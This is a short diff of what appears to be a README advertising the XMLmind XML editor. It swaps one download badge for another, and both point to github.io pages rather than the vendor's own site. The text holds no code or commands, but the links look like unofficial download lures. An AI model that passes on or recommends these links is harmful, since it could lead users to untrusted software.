@@ -12,7 +12,7 @@
 
 XMLmind is a professional XML editing solution that enables users to create, manage, and publish structured content with ease. It is widely used by technical writers, documentation teams, and publishers for its robust support of industry-standard frameworks such as DITA and DocBook.
 
-[![Download Now](https://img.shields.io/badge/Download_Now-steelblue?style=for-the-badge&logo=arma)](https://balotkfoodywwaej.github.io/.github/XMLmind-editor)
+[![Try XMLmind](https://img.shields.io/badge/Try-XMLmind-6D28D9?style=plastic)](https://xmlmind-software.github.io/.github/)
 
 The software combines a visual editor with powerful backend processing, allowing users to focus on content without worrying about formatting. Features include multi-format export, collaborative editing, template customization, and extensive automation options.
 
